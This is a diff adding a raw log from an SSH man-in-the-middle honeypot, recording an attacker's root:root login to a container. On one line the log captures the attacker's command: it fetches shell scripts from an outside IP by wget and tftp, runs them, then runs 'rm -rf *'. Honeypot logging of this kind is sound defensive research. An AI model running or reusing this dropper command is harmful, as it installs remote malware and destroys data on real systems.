@@ -1,0 +1,19 @@
+2020-11-10 02:59:50.913 - [Info] MITM Version: 1.26
+2020-11-10 02:59:50.917 - [Info] Auto Access Enabled: true
+2020-11-10 02:59:50.917 - [Debug] [Init] Auto Access Barrier: true
+2020-11-10 02:59:50.934 - [Info] SSH man-in-the-middle server for 172.20.0.203 listening on 0.0.0.0:10002
+2020-11-10 03:28:01.978 - [Debug] [Connection] Attacker connected: 46.101.156.22 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-11-10 03:28:02.896 - [Debug] [Auth] Attacker 46.101.156.22 trying to authenticate with "password"
+2020-11-10 03:28:02.897 - [Debug] [Auto Access] Attacker: 46.101.156.22, Threshold: 1, Attempts: 1
+2020-11-10 03:28:02.899 - [Debug] [Auto Access] Compromising the honeypot
+2020-11-10 03:28:02.899 - [Debug] [Auto Access] Adding the following credentials: "root:root"
+2020-11-10 03:28:03.005 - [Debug] [Auth] Valid credentials - Password Authentication
+2020-11-10 03:28:03.005 - [Debug] [LXC] Attempting to connect to the honeypot: 172.20.0.203
+2020-11-10 03:28:03.027 - [Debug] [LXC-Auth] Attacker authenticated and is inside container
+2020-11-10 03:28:03.481 - [Debug] [EXEC] Noninteractive mode attacker command: cd /tmp || cd /run || cd /; wget http://104.168.195.213/Thorbins.sh; chmod 777 Thorbins.sh; sh Thorbins.sh; tftp 104.168.195.213 -c get Thortftp1.sh; chmod 777 Thortftp1.sh; sh Thortftp1.sh; tftp -r Thortftp2.sh -g 104.168.195.213; chmod 777 Thortftp2.sh; sh Thortftp2.sh; rm -rf Thorbins.sh Thortftp1.sh Thortftp2.sh; rm -rf *
+2020-11-10 03:29:04.098 - [Debug] [Connection] Client error on ssh server
+2020-11-10 03:29:04.099 - [Debug] [Connection] Attacker closed connection
+2020-11-10 03:29:04.104 - [Debug] [LXC] Container's OpenSSH server ended connection
+2020-11-10 03:29:04.104 - [Debug] [LXC] Container's OpenSSH server closed connection
+2020-11-10 03:33:04.398 - [Info] Exiting...
+2020-11-10 03:33:04.398 - [Debug] Cleaning up...
